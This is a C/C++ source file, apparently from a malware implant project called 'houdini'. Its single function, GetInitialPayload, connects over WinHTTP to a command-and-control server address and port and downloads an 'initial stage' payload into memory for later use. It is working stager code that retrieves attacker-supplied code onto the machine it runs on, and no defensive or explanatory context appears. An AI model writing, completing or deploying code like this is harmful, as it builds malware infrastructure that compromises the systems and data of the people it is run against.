#include "simpleHttp.h"
#include "houdini.h"

LPSTR GetInitialPayload(){
	DWORD dwSize = 0;
	DWORD dwDownloaded = 0;
	LPSTR pszOutBuffer;
	LPSTR result = NULL;
	int server_resp_size = 10000000;
	LPSTR server_resp = (char*)malloc(server_resp_size);
	server_resp[0] = '\x00';
	BOOL  bResults = FALSE;
	HINTERNET hSession = NULL;
	HINTERNET hConnect = NULL;
	HINTERNET hRequest = NULL;

	hSession = WinHttpOpen(L"WinHTTP Example/1.0",
		WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
		WINHTTP_NO_PROXY_NAME,
		WINHTTP_NO_PROXY_BYPASS, 0);

	if (hSession)
		hConnect = WinHttpConnect(hSession, cnc_ip, cnc_port, 0);

	if (hConnect)
		hRequest = WinHttpOpenRequest(hConnect, L"GET", initial_stage_path,
		NULL, WINHTTP_NO_REFERER,
		WINHTTP_DEFAULT_ACCEPT_TYPES,
		NULL);

	if (hRequest){
		bResults = WinHttpSendRequest(hRequest,
			WINHTTP_NO_ADDITIONAL_HEADERS,
			0, WINHTTP_NO_REQUEST_DATA, 0,
			0, 0);
#ifdef _DEBUG
		printf("Sending initial stage request...\n");
#endif
	}

	if (bResults){
		bResults = WinHttpReceiveResponse(hRequest, NULL);
#ifdef _DEBUG
		printf("Got result, receiving...\n");
	}else{
		printf("Something went wrong while requesting the initial stage.\n");
#endif
	}

	if (bResults)
	{
		do
		{
			dwSize = 0;
			if (!WinHttpQueryDataAvailable(hRequest, &dwSize))
			{
#ifdef _DEBUG
				printf("Error %u in WinHttpQueryDataAvailable.\n",
					GetLastError());
#endif
				break;
			}

			if (!dwSize)
				break;

			pszOutBuffer = new char[dwSize + 1];
			if (!pszOutBuffer)
			{
#ifdef _DEBUG
				printf("Out of memory while reading initial stage\n");
#endif
				break;
			}

			ZeroMemory(pszOutBuffer, dwSize + 1);

			if (!WinHttpReadData(hRequest, (LPVOID)pszOutBuffer,
				dwSize, &dwDownloaded))
			{
#ifdef _DEBUG
				printf("Error %u in WinHttpReadData.\n", GetLastError());
#endif
			}
			else
			{
				strcat_s(server_resp, server_resp_size, pszOutBuffer);
				memset(pszOutBuffer, 0, dwSize);
			}

			delete[] pszOutBuffer;

			if (!dwDownloaded)
				break;

		} while (dwSize > 0);

		int response_size = strlen(server_resp);
		if (response_size > 0){
			result = (char *)malloc(response_size + 1);
			strncpy_s(result, response_size + 1, server_resp, response_size);
			result[response_size] = '\x00';
		}
	}

#ifdef _DEBUG
	if (!bResults)
		printf("Error %d has occurred.\n", GetLastError());
#endif

	if (hRequest) WinHttpCloseHandle(hRequest);
	if (hConnect) WinHttpCloseHandle(hConnect);
	if (hSession) WinHttpCloseHandle(hSession);
	return result;
}